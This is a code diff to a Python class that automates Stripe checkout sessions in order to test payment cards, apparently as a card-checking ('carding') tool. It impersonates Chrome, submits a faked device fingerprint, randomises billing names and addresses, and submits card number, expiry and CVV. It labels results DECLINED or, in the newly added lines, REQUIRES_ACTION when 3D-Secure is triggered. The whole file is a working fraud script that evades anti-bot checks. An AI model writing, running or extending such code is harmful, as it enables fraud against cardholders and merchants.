@@ -102,14 +102,14 @@ class StripeSession:
             self.session = cffi.AsyncSession(impersonate="chrome131", verify=False)
             ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
 
-            # Step 1: Warmup GET
+            # Warmup GET
             await self.session.get(
                 f"https://checkout.stripe.com/c/pay/{self.cs}",
                 headers={'accept': 'text/html', 'user-agent': ua},
                 timeout=12
             )
 
-            # Step 2: Fingerprint simulation via m.stripe.com/6
+            # Fingerprint simulation via m.stripe.com/6
             fp_payload = {
                 'v': 2, 'tag': '5.6.8_js_fp', 'src': 'checkout-inner-live-v3',
                 'a': {'a': self.pk, 'b': f"https://checkout.stripe.com/c/pay/{self.cs}", 'c': 24, 'd': '1920x1080', 'e': False, 'f': 'en-US', 'g': 'Win32', 'h': ua, 'i': -300, 'j': False, 'k': 8, 'l': 8}
@@ -127,7 +127,7 @@ class StripeSession:
                     if fpj.get('sid'): self.tracking['sid'] = fpj['sid']
                     if fpj.get('guid'): self.tracking['guid'] = fpj['guid']
 
-            # Step 3: Init Session
+            # Init Session
             init_headers = {
                 'accept': 'application/json',
                 'content-type': 'application/x-www-form-urlencoded',
@@ -159,7 +159,6 @@ class StripeSession:
             if acct_set.get('display_name'):
                 self.merchant_name = acct_set['display_name']
 
-            # حل المبالغ بدقة من الـ Init
             lig = d.get('line_item_group') or {}
             inv = d.get('invoice') or {}
             pi = d.get('payment_intent') or {}
@@ -200,7 +199,6 @@ class StripeSession:
         ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
 
         try:
-            # عشوائية بيانات الفواتير مثل سكربت الـ PHP
             first_names = ['James', 'John', 'Robert', 'Michael', 'William', 'David']
             last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones']
             streets = ['Main St', 'Oak Ave', 'Maple Dr', 'Cedar Ln', 'Pine Rd']
@@ -256,7 +254,6 @@ class StripeSession:
             if not pm_id:
                 return {"status": "DECLINED", "card": f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}|{cvv}", "amount": f"{self.currency} {self.amount/100:.2f}", "response_time": time.time() - t0, "message": "Failed to create Payment Method"}
 
-            # بناء وتأكيد الدفع Confirm
             confirm_body = {
                 'eid': 'NA',
                 'payment_method': pm_id,
@@ -286,8 +283,12 @@ class StripeSession:
             if resp.get('error'):
                 err_obj = resp['error']
                 err_msg = err_obj.get('message', 'Declined')
+                code = str(err_obj.get('code', '')).lower()
+                status = "DECLINED"
+                if "authentication" in err_msg.lower() or "3d" in err_msg.lower() or code == "authentication_required":
+                    status = "REQUIRES_ACTION"
                 return {
-                    "status": "DECLINED",
+                    "status": status,
                     "card": f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}|{cvv}",
                     "amount": f"{self.currency} {self.amount/100:.2f}",
                     "response_time": time.time() - t0,
